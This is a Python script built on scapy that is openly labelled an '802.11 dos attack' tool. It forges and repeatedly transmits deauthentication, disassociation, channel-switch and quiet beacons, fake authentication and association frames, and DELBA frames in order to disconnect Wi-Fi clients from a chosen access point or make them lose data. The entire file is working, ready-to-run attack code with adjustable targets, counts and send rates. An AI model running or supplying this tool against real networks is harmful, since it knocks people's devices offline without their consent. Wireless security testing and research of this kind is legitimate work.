#!/usr/bin/env python3

from scapy.all import *
import argparse
import sys
import time


parser = argparse.ArgumentParser(description='802.11 dos attack',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('attack_type', metavar='attack_type', type=str, nargs='?',
                    help=
"""
dos attack type. now support : 

deauth     (deauthentication attack , not work in managed frame protect)
disas      (disassociation attack,not work in managed frame protect)
csa        (beacon frame with channel switch announcement)
fake_auth  (send a authentication frame cause key lose)
delba      (send a delete block action cause data lose) 
""")


parser.add_argument('-i', dest="iface", nargs='?', type=str, help='the wireless interface', required=True)
parser.add_argument('-c', dest="count", nargs='?', type=int, help='number of packet send,0 or omit represent send until stop')
parser.add_argument('--interval', dest="interval", nargs='?', type=float, help='send interval float type in second ,0 represent send as fast as possible')
parser.add_argument('--ap-ssid', dest="ap_ssid", type=str, nargs="?", help='ap ssid')
parser.add_argument('--ap-bssid', dest="ap_bssid", type=str, nargs='?', help='ap mac address', required=True)

parser.add_argument('--client-mac', dest="client_mac", type=str, nargs="?",
                    help='client mac address,default FF:FF:FF:FF:FF:FF ')

parser.add_argument('--rate', dest="rate", nargs="+", type=int,
                    help='beacon support rate tag,in decimal. default [0x82,]')
parser.add_argument('--cap', dest="cap", nargs="?", type=int,
                    help='beacon cap ,in decimal. default 1<<8')
parser.add_argument('--switch-channel', dest="channel", nargs="?", type=int,
                    help='channel switch announcement need this flag,represent which cahnnel to switch')

parser.add_argument('--deauth-reason', dest="reason", nargs="?", type=int, help='deauth reason code,default 3')

parser.add_argument('--auth-algorithm', dest="auth_algorithm", nargs="?", type=int,
                    help='fake authentication algorithm,0 is open auth,1 is pre share key, default 1')

args = parser.parse_args()

attack_type=args.attack_type
ifc = args.iface
interval = args.interval
ap_mac = args.ap_bssid
cli_mac = args.client_mac
send_count = args.count
broadcast = "FF:FF:FF:FF:FF:FF"
if not cli_mac:
    cli_mac = broadcast
if not interval:
    interval=0
# beacon frame
ssid = args.ap_ssid
tag_num_ssid = 0
tag_num_csa = 37
tag_num_quiet = 40
support_rates = args.rate
channel = args.channel
if not ssid:
    ssid=""
if not support_rates:
    # support_rates = [0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c]
    support_rates = [0x82,]
cap=args.cap
if not cap:
    cap=1<<8

# deauth
reason = args.reason
if not reason:
    reason = 3
#fake auth
auth_algorithm = args.auth_algorithm
if not auth_algorithm:
    auth_algorithm=1


def beacon_frame():
    return RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac) / \
           Dot11Beacon(cap=cap) / \
           Dot11Elt(ID=tag_num_ssid, len=len(ssid), info=bytes(ssid, 'utf-8')) / Dot11EltRates(rates=support_rates)


def switch_channel_annountation():
    if not channel:
        print("channel must provide in csa")
        sys.exit(1)

    return beacon_frame() / Dot11Elt(ID=tag_num_csa, len=3, info=bytes([0, channel, 1]))


def beacon_quiet():
    return beacon_frame() / Dot11Elt(ID=tag_num_quiet, len=6, info=bytes([0,0,4000&0xff,4000>>8,0,0]))

def deauth():
    return RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac) / Dot11Deauth(reason=reason)


def disassociation():
    return RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac) / Dot11Disas(reason=reason)


def fake_auth():
    return [
        RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, addr4=cli_mac) / Dot11Auth(algo=auth_algorithm,
                                                                                                 seqnum=1,
                                                                                                 status=0),

        RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, addr4=cli_mac) / Dot11AssoReq() / \
        Dot11Elt(ID=tag_num_ssid, len=len(ssid), info=bytes(ssid, 'utf-8')) / Dot11EltRates(rates=support_rates),
    ]




def del_block_ack():
    tid=0
    class Dot11DELBA(Packet):
        name = "802.11 DELBA"
        fields_desc = [
            ByteField("category", 3),
            ByteField("action", 2),
            ShortField("param", 0),
           LEShortField("reason", 0),
        ]

    return[
        RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, type=0, subtype=13) / Dot11DELBA(param=(1<<3)+(tid<<4),
                                                                                                       reason=37),
        RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, type=0, subtype=13) / Dot11DELBA(param=(0<<3)+(tid<<4),
                                                                                                       reason=37),

        RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac, type=0, subtype=13) / Dot11DELBA(
            param=(1 << 3) + (tid << 4),
            reason=37),
        RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac, type=0, subtype=13) / Dot11DELBA(
            param=(0 << 3) + (tid << 4),
            reason=37),
    ]
attack = {
    "deauth": deauth,
    "csa": switch_channel_annountation,
    "disas": disassociation,
    "fake_auth": fake_auth,
    "quiet": beacon_quiet,
    "delba": del_block_ack,
}

if __name__ == "__main__":
    i=0
    def print_send():
        global i
        print('\rsend frame count: %d' %i,end="")


    try:
        frame=attack[attack_type]()
        if not send_count:
            while 1:
                i += 1
                sendp(frame,iface=ifc,verbose=False)
                print_send()
                time.sleep(interval)
        else:
            for _ in range(send_count):
                i += 1
                sendp(frame, iface=ifc, verbose=False)
                print_send()
                time.sleep(interval)
        print_send()
    except KeyError :
        print("unknow attack type %s" %attack_type)



